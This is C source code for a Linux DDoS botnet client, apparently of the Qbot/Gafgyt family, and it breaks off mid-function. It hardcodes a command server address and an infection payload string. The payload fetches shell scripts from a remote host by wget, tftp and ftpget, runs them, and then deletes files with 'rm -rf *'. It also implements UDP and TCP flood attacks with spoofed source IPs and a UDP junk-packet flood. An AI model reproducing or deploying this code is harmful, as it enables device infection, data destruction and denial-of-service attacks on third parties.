#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define std_packets 1460
#define BUFFER_SIZE 512
unsigned char *commServer[] = {"10.1.1.12:666"};
//u cant use another type of bins if u plan to use the update command
char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://10.2.0.15/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 10.2.0.15 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 10.2.0.15; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 10.2.0.15 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";

const char *useragents[] = { 
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/597.31",
    "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "TheSuBot/0.2 (www.thesubot.de)",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "zspider/0.9-dev http://feedback.redkolibri.com/",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/597.31",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/597.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/531.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/531.5",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
    "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B317 Safari/531.21.10 UCBrowser/3.4.3.532",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/531.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/597.31",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8", 
    "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.9705)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/597.31",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/597.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/597.31",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/597.31",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/597.31 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/597.31"
};

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e9779b9
static uint32_t Q[4096], c = 312431;
unsigned char macAddress[6] = {0};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	register unsigned int pollRegister;
	pollRegister = pollinterval;

	if(spoofit == 32)
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd)
		{
			return;
		}

		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			if(i == pollRegister)
			{
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	} else {
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd)
		{
			return;
		}

		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
		{
			return;
		}

		int counter = 50;
		while(counter--)
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}

		in_addr_t netmask;

		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );

		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;

		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( getRandomIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);

			if(i == pollRegister)
			{
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	}
}

void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		return;
	}

	in_addr_t netmask;

	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;

	if(!strcmp(flags, "all"))
	{
		tcph->syn = 1;
		tcph->rst = 1;
		tcph->fin = 1;
		tcph->ack = 1;
		tcph->psh = 1;
	} else {
		unsigned char *pch = strtok(flags, ",");
		while(pch)
		{
			if(!strcmp(pch,         "syn"))
			{
				tcph->syn = 1;
			} else if(!strcmp(pch,  "rst"))
			{
				tcph->rst = 1;
			} else if(!strcmp(pch,  "fin"))
			{
				tcph->fin = 1;
			} else if(!strcmp(pch,  "ack"))
			{
				tcph->ack = 1;
			} else if(!strcmp(pch,  "psh"))
			{
				tcph->psh = 1;
			} else {
			}
			pch = strtok(NULL, ",");
		}
	}

	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);

	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( getRandomIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}
void astd(unsigned char *ip, int port, int secs) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {
                char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
                                     "/x53/x65/x6c/x66/x20/x52/x65/x70/x20/x46/x75/x63/x6b/x69/x6e/x67/x20/x4e/x65/x54/x69/x53/x20/x61/x6e/x64/x20/x54/x68/x69/x73/x69/x74/x79/x20/x30/x6e/x20/x55/x72/x20x46/x75/x43/x6b/x49/x6e/x47/x20/x46/x6f/x52/x65/x48/x65/x41/x64/x20/x57/x65/x20/x42/x69/x47/x20/x4c/x33/x33/x54/x20/x48/x61/x78/x45/x72/x53/x0a",
                                     "\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a",
                                     "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
